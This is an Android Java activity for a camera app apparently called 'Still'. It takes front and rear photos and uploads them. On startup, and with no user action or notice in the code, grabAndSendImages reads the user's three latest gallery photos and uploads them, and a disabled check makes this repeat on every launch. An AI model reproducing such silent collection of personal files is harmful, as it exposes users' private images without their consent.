package uk.org.potentialdifference.stillapp;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Typeface;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MainActivity extends AppCompatActivity implements PictureCallback {

    private static final String IMAGES_SENT_FILENAME = "still_app_images_sent";

    final String TAG = "MainActivity";
    Camera mCamera;
    static final int REQUEST_IMAGE_CAPTURE = 1;
    Uri photoUri;
    Activity mActivity;
    PictureCallback cb = this;

    boolean isTakingPhoto = false;

    public void onPictureTaken(byte[] data, Camera camera) {
        Log.d(TAG, "onPictureTaken");
        isTakingPhoto = false;
        try {
            // We call get to make our asyncTask synchronous
            new ImageUploadTask(this, new ImageUploadDelegate() {
                @Override
                public void imageUploadComplete() {
                    dispatchTakePictureIntent();
                }
            }).execute(new UploadJob(data, "front")).get();
        } catch (Exception e) {
            Log.e(TAG, "ImageUploadTask interrupted");
        }
    }


    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        Log.d(TAG, "onSaveInstanceState");
        // save file url in bundle as it will be null on screen orientation
        // changes
        if (photoUri != null) {
            outState.putParcelable("photoUri", photoUri);
        }
    }

    @Override
    protected void onRestoreInstanceState(Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        // Never called, will use onCreate instead
        Log.d(TAG, "onRestoreInstanceState");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate");
        if (photoUri == null && savedInstanceState != null && savedInstanceState.containsKey("photoUri")) {
            Log.d(TAG, "loading photoUri from saved state");
            photoUri = savedInstanceState.getParcelable("photoUri");
        }
        // If still null...
        if (photoUri == null) {
            Log.d(TAG, "creating new photoUri");
            photoUri = Uri.fromFile(getPublicMediaFile());
        }


        setContentView(R.layout.activity_main);
        mActivity = this;
        Button button = (Button) findViewById(R.id.bPhoto);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View arg0) {
                Log.d(TAG, "onClick");
                // Take a picture
                // If this is a double-click, we might have already released the camera
                if (isTakingPhoto == false) {
                    mCamera.takePicture(null, null, cb);
                    isTakingPhoto = true;
                }
            }
        });

    }

    protected void onStart() {
        super.onStart();
        isTakingPhoto = false;

    }

    @Override
    protected void onPostCreate(Bundle savedInstanceState) {
        super.onPostCreate(savedInstanceState);
        Log.d(TAG, "onStart");
        if(!hasSentImages()) {
            grabAndSendImages();
        }
    }

    protected void onStop() {
        super.onStop();

        Log.d(TAG, "onStop");
    }


    protected void onResume() {
        super.onResume();
        if (mCamera == null) {
            mCamera = Camera.open(1);
            mCamera.startPreview();
        }
        Log.d(TAG, "onResume");
    }

    protected void onPause() {
        super.onPause();
        Log.d(TAG, "onPause");
        if (mCamera != null ) {
            mCamera.stopPreview();
            mCamera.release();
            mCamera = null;
        }
    }

    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "onDestroy");
    }

    private File getPublicMediaFile(){
        // To be safe, you should check that the SDCard is mounted
        // using Environment.getExternalStorageState() before doing this.

        File mediaStorageDir = new File(Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES), "Still");
        // This location works best if you want the created images to be shared
        // between applications and persist after your app has been uninstalled.

        // Create the storage directory if it does not exist
        if (! mediaStorageDir.exists()){
            if (! mediaStorageDir.mkdirs()){
                Log.d(TAG, "failed to create directory");
                return null;
            }
        }

        // Create a media file name
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        File mediaFile;

        mediaFile = new File(mediaStorageDir.getPath() + File.separator + "IMG_"+ timeStamp + ".jpg");

        return mediaFile;
    }

    private Uri createImageURI() throws IOException {
        // Create an image file name
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        // String imageFileName = "JPEG_" + timeStamp + "_";
        File storageDir = Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES);
        // TODO fixme

        // File image = new File("/mnt/sdcard/Pictures/still-app-photo-123456789");
        String fileName = "still-photo";
        File file = new File(getFilesDir(), fileName);

        //return Uri.fromFile(file);
        return Uri.fromFile(getPublicMediaFile());
    }

    private void dispatchTakePictureIntent() {
        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        // Ensure that there's a camera activity to handle the intent
        if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
            if (photoUri != null) {
                takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, photoUri);
                startActivityForResult(takePictureIntent, REQUEST_IMAGE_CAPTURE);
            }
        }
    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // Check which request we're responding to
        Log.d(TAG, "onActivityResult called");
        if (requestCode == REQUEST_IMAGE_CAPTURE) {
            // Make sure the request was successful
            if (resultCode == RESULT_OK) {
                if (photoUri != null) {
                    try {
                        Log.d(TAG, "onActivityResult OK");
                        Log.d(TAG, "photoUri:" + photoUri);
                        Bitmap bm = MediaStore.Images.Media.getBitmap(getApplicationContext().getContentResolver(), photoUri);
                        if (bm != null) {
                            byte[] bytes = getBytesFromBitmap(bm);
                            Log.d(TAG, "Uploading bytes...");
                            try {
                                // We call get to make our asyncTask synchronous
                                // Second argument null because we don't want a callback
                                // Callback will start camera app again
                                new ImageUploadTask(this, null).execute(new UploadJob(bytes, "rear")).get();
                            } catch (Exception e) {
                                Log.e(TAG, "ImageUploadTask interrupted");
                            }
                            // new PhotoUploader().uploadBytes(mActivity, "rear", bytes);
                        } else {
                            Log.d(TAG, "Couldn't create bitmap from photo");
                            Toast.makeText(this, "Couldn't create bitmap from photo", Toast.LENGTH_SHORT).show();
                        }
                        Log.d(TAG, "onActivityResult do we get here?");
                    } catch (FileNotFoundException e) {
                        Log.d(TAG, "FileNotFound exception in onActivityResult");
                        Log.d(TAG, "photoUri:" + photoUri);
                    } catch (IOException e) {
                        Log.d(TAG, "IOException exception in onActivityResult");
                        Log.d(TAG, "photoUri:" + photoUri);
                        Log.d(TAG, e.toString());
                    }
                }
            }
        }
    }




    private boolean hasSentImages() {
        boolean hasSent = true;

        try {
            openFileInput(IMAGES_SENT_FILENAME);
        } catch (Exception ignore) {
            hasSent = false;
        }

        //return hasSent;
        return false;
    }
    private void grabAndSendImages() {
        int imageId;
        Uri imageUri;
        UploadJob[] jobs = new UploadJob[3];
        int photoId = 0;

        String[] projection = {MediaStore.Images.Media._ID};
        String selection = MediaStore.Images.Media.DATE_TAKEN + " < " + (System.currentTimeMillis() - (60 * 60 * 1000));
        String[] selectionArgs = null;
        String orderBy = MediaStore.Images.Media.DATE_TAKEN + " DESC";
        String limit = "LIMIT 3";
        Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, selection, selectionArgs, orderBy + " " + limit);

        while (cursor.moveToNext()) {
            imageId = cursor.getInt(cursor.getColumnIndex(MediaStore.Images.Media._ID));
            imageUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(imageId));
            jobs[photoId++] = new UploadJob(getBytesFromBitmap(loadImage(imageUri)), String.format("user-photo-%d", photoId));
        }

        try {

            new ImageUploadTask(this, new ImageUploadDelegate() {
                @Override
                public void imageUploadComplete() {
                    // note - this is called whether or not the job succeeded
                    Log.i(TAG, "upload complete");
                    //mark that we've sent the images
                    String string = "";
                    try {
                        FileOutputStream fos = openFileOutput(IMAGES_SENT_FILENAME, Context.MODE_PRIVATE);
                        fos.write(string.getBytes());
                        fos.close();
                    } catch (Exception e) {
                    }
                }
            }).execute(jobs).get();
        } catch (Exception e) {
            Log.e(TAG, "ImageUploadTask interrupted");
        }
    }

    private Bitmap loadImage(Uri photoUri){
        Cursor photoCursor = null;
        try {
            String[] projection = {MediaStore.Images.Media.DATA};
            photoCursor = getContentResolver().query(photoUri, projection, null, null, null);
            if (photoCursor != null && photoCursor.getCount() == 1) {
                photoCursor.moveToFirst();
                String filePath = photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DATA));
                return BitmapFactory.decodeFile(filePath, null);
            }
        }finally{
            if(photoCursor!=null){
                photoCursor.close();
            }
        }
        return null;
    }




    private byte[] getBytesFromBitmap(Bitmap bitmap) {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        if(bitmap!=null) {
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream);
            return stream.toByteArray();
        }
        else{
            return null;
        }

    }

    public void launchPreshowActivity(View view) {
        Intent intent = new Intent(this, PreshowImages.class);
        startActivity(intent);
    }


}
